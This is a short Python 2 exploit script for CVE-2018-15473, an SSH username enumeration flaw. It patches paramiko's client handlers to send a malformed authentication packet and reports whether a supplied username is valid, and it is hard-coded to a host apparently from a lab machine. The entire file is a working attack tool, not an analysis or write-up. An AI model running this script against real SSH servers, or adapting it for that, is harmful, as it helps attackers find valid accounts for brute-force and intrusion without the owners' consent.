#!/usr/bin/env python2
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter


import argparse, logging, paramiko, socket, sys, os, pdb

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid
def userauth_failure(*args, **kwargs):
    raise InvalidUsername()

# paramiko.auth_handler.AuthHandler._handler_table.update({
#     paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
#     paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
# })

paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = userauth_failure

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

if len(sys.argv) < 2 :
    print("Incorrect number of arguments. Usage:")
    print("     ", sys.argv[0], "<username>");
    sys.exit(1)

username=sys.argv[1]
port = 2082
target = "votenow.local" # 192.168.1.142"

print("[+] Trying target: " + target + " port: " + str(port)+ " username: " + username)

sock = socket.socket()
try:
    sock.connect((target, port))
except socket.error:
    print ("[-] Failed to connect")
    sys.exit(1)

transport = paramiko.transport.Transport(sock)
try:
    transport.start_client()
except paramiko.ssh_exception.SSHException:
    print ("[!] Failed to negotiate SSH transport")
    sys.exit(2)

print ("[+] SSH transport negotiation ok.")

try:
    transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
except InvalidUsername:
    print("[*] " + username + " is an invalid username")
    sys.exit(3)
except paramiko.ssh_exception.AuthenticationException:
    print("[+] " + username + " is a valid username")
